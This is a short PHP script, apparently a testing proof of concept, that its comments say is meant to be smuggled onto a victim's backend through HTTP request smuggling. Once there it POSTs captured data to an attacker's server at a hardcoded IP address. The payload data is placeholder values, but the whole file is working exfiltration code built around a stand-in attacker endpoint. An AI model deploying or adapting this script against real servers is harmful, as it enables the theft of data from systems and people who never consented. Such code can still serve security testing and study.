<?php
    // PHP script to be smuggled via. HTTP Request Smuggling, and executed on the victim's backened to POST 'sensitive data' back to the attacker's server.
    // Note: Below code is for testing purposes. In the event of a real attack, this script will expose the attacker's server IP to the victim, which must be considered to not unknowingly expose youself over the network.

    // Store location to POST data back(Attacker's Server) to in memory
    $url = 'http://192.168.4.24/';

    // Capture data from victim's backend server
    $data = ['key1' => 'value1', 'key2' => 'value2'];

    // Force HTTP request regardless of proctol expected from server
    $request_parameters = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data),
        ],
    ];

    // Convert HTTP request to "sequence of bytes" ('stream') | "minimal set of data used by a task" ('context')
    $request = stream_context_create($request_parameters);

    // Read file hosted at IP provided in $URL, (false) do not specify path to enumerate, ('context') specify custom set of data to pass in our request. This request will be a HTTP POST request. Store response from POST request in $response
    $response = file_get_contents($url, false, $request);

    // Check if data returned from our POST request is identical to 'false', in this case indicating an empty response from the attacker's server. Note: Probably don't want to return anything back to the victim's server.
    if ($response === false) {
        var_dump('No response?!');
    }

    // Output response.
    var_dump($response);
?>
